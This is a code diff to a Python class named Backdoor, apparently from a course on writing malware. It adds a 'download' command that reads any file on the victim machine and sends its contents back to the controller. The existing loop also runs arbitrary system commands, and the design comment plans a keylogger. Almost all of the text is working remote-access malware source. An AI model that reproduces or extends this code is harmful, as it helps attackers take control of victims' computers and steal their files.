@@ -14,6 +14,12 @@ Backdoor:
         1. Command execution
         2. Access file system
         3. Upload/Download files
+            - a file is a series of character
+            - transfer a file we need to:
+                a) read the file as a sequence of characters
+                b) send this sequence of characters
+                c) create a new emtpy file at destination
+                d) store the transferred sequence of characters in the new file
         4. Run keylogger
         ...
  
@@ -87,6 +93,15 @@ class Backdoor:
         os.chdir(path)
         return "[+] Changing working directory to " + path
 
+    def read_file(self, path):
+        """
+        Read a file from the path
+        :param path: the path that contains the file we wanted to read
+        :type path: str
+        """
+        with open(path, "rb") as file:
+            return file.read()
+
     def run(self):
         """
         Run the backdoor program.
@@ -94,15 +109,21 @@ class Backdoor:
         while True:
             command = self.reliable_receive()
             command_result = ""
+            # exit command
             if command[0] == "exit":
                 self.connection.close()
                 exit()
 
+            # cd command
             elif command[0] == "cd" and len(command) > 1:
                 command_result = self.change_working_directory_to(command[1])
 
+            # read file
+            elif command[0] == "download" and len(command) > 1:
+                command_result = self.read_file(command[1])
+
+            # execute command
             else:
-                # execute command
                 command_result = self.execute_system_command(command)
 
             self.reliable_send(command_result)
